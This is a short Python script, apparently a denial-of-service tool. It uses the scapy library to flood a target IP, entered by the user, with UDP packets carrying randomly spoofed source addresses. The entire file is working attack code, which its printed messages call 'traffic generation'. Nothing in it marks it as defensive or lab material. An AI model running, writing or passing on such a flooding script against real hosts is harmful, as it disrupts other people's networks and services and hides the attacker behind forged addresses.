from scapy.all import IP, send,UDP
import random
import time

def Dos_attack(target_ip, target_port=4000, packet_count=1005, delay=0):
    print(f"Starting traffic generation to {target_ip}:{target_port} with {packet_count} packets.")

    for i in range(packet_count):
        # Random source IP to simulate spoofing (optional)
        src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        print(src_ip)
        ip = IP(src=src_ip, dst=target_ip)
        udp = UDP(sport=target_port)
        packet = ip / udp
        send(packet, verbose=False)
        print(f"send Packet to dst {target_ip} Number {i}")
        if delay > 0:
            time.sleep(delay)

    print("Traffic generation completed.")

if __name__ == "__main__":
    target = input("ENTER THE TARGET IP\n")  # Replace with your target IP
    Dos_attack(target_ip=target, packet_count=2000, delay=0.01)